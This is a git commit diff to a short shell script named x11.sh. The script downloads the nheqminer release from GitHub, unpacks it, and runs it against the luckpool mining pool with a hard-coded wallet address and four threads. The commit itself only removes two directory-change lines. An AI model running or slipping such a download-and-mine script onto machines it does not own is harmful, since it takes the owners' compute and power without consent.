d7b9647dc806cbc554e0aeba7964edb9f2167fa9
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 23:14:14 -0300

    Update x11.sh

--- x11.sh
+++ x11.sh
@@ -1,7 +1,5 @@
 #!/bin/sh
-DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.0/nheqminer-Linux-v0.8.0.tar.gz
 tar -xf nheqminer-Linux-v0.8.0.tar.gz
 cd nheqminer
-cd $DIR
 ./nheqminer -v -l na.luckpool.net:3956 -u RV15qZeZ9qggbWznCwQ8mcvfyRrhB9zEEN.Rig1 -p x -t 4
